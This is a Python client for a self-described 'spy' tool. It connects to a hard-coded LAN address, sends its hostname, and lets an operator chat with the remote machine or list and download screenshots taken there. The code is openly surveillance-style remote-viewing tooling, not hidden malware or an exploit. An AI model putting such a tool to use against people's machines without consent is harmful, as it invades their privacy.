from spy_support import interaction, menu
from PIL import Image
import socket
import sys
import os
import io

IP = "192.168.254.196"
HEADER_LENGTH = 10


def chat_server(client_socket):
    print("\n[SEND MESSAGE TO SERVER]")
    menu.print_menu("chat")
    while True:
        message = input("Your command/message: ")
        if message.lower() == "!b":
            break
        elif message.lower() == "!d":
            interaction.disconnect_client(client_socket)
            sys.exit()
        else:
            interaction.send_message(client_socket, interaction.CMD_CHAT)
            interaction.send_message(client_socket, message)

def spy_server(client_socket):
    spying = True
    while spying:
        print("\n[SPY SERVER]")
        screenshot = {}
        interaction.send_message(client_socket, interaction.CMD_REQUESTSCREENSHOTS)
        screenshot_list = interaction.receive_message(client_socket, role="client")
        for i in range(len(screenshot_list)):
            screenshot[i] = screenshot_list[i]
            print(f"{i + 1} --> {screenshot_list[i]}")
        menu.print_menu("spy")
        while True:
            valid = False
            while not valid:
                message = input("Your command / view screenshot number: ")
                if message not in [interaction.CMD_REQUESTSCREENSHOTS, interaction.CMD_DISCONNECT, interaction.CMD_BACKTOMAIN]:
                    if message.isnumeric():
                        screenshot_number = int(message) - 1
                        if 0 <= screenshot_number < len(screenshot_list):
                            break
                    print("[!] Command not recognized")
                    continue
                valid = True
            if message.lower() == "!r":
                break
            elif message.lower() == "!b":
                spying = False
                break
            elif message.lower() == "!d":
                interaction.disconnect_client(client_socket)
                sys.exit()
            else:
                interaction.send_message(client_socket, interaction.CMD_VIEWIMAGE)
                interaction.send_message(client_socket, screenshot[screenshot_number])
                image_available = bool(interaction.receive_message(client_socket, role="client"))
                if image_available:
                    image_bytes = b''
                    image_bytes += interaction.receive_image(client_socket)
                    image_bytes += interaction.receive_image(client_socket)
                    image_bytes += interaction.receive_image(client_socket)
                    image_bytes += interaction.receive_image(client_socket)
                    image_bytes += interaction.receive_image(client_socket)
                    image = Image.open(io.BytesIO(image_bytes))
                    image.show()
                    print("received image")
                else:
                    print("[FAILED] The requested image has expired.")
        if not spying:
            break

def start_client():
    valid = False
    while not valid:
        port_temp = input("Enter server port number: ")
        if port_temp.isnumeric():
            port = int(port_temp)
            valid = True
        else:
            print("[!] Invalid input")

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP, port))

    interaction.send_message(client_socket, socket.gethostname())
    # welcome_message = receive_message(client_socket)
    welcome_message = interaction.receive_message(client_socket, role="client")
    print(f"\n{welcome_message}\n")

    while True:
        print("\n[MAIN MENU]")
        print("Please select a command of your choice from the menu below")
        menu.print_menu("main")

        valid = False
        while not valid:
            command = input("Your command: ")
            if command.lower() in menu.get_command_list():
                command = command.lower()
                valid = True
            else:
                print("[!] Command not recognized.")

        if command == "s":
            spy_server(client_socket)
        elif command == "m":
            chat_server(client_socket)
        elif command == "!d":
            interaction.disconnect_client(client_socket)
            sys.exit()


if __name__ == "__main__":
    start_client()